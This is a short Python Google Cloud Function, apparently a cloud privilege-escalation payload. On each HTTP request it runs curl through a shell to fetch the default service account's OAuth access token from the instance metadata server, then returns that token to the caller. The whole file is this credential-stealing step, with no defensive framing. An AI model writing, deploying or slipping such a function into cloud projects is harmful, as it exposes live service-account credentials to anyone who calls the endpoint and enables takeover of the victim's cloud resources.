import functions_framework
import subprocess

@functions_framework.http
def main(request):
    cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
    result = subprocess.check_output(cmd, shell=True, text=True)
    return result
